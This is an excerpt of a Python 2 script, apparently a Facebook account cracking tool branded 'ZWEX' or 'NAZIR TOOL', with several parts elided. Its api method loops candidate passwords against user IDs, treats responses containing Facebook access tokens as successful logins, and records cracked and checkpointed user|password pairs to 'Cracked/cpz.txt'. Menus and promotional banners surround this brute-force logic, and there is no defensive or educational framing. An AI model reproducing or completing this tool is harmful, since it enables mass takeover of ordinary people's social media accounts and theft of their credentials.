...
def results(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\xe2\x94\x9c  Subscribe My Channel: ZWEX Tool             \xe2\x94\xa4'
        print '\xe2\x94\x9c  Subscribe My Channel: ZWEX TOOL            \xe2\x94\xa4'
        print '\xe2\x94\x9c  Like And Follow My Facebook Page: KOS K GUTA \xe2\x94\xa4'
...
def login():
    ...
    try:
        ...
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9AUTHOR NAME : ZWEX NAZIR AJMAL     \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9YouTube    : NOT  USE       \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x94' + 35 * '\xe2\x94\x80' + '\xe2\x94\x98      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'

    zk = raw_input('\n  \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;92m] Type NAZIR To Enter The NAZIR TOOL: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        login()
    elif zk == 'NAZIR' or zk == 'hamii':
        zmbf()
    else:
...
def cracking_menu():
    ...
    try:
        ...
        os.system('clear')
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;92m] Removing Token..! Login Again')
        os.system('rm -rf login.txt')
        zmbf()
    except requests.exceptions.ConnectionError:
    ...
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;94m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        cracking_menu()
...
class crackmenu:
    ...
    def passmenu(self, isifile):
        ...
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input(' \x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
        if zk in ('M', 'm', '2', '02'):
            os.system('clear')
            print cracklogo
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    ...
    def api(self, user, zkth):
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[ZWEX OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    print '\r%s[ZWEX CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                ...
                print '\r%s[ZWEX CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
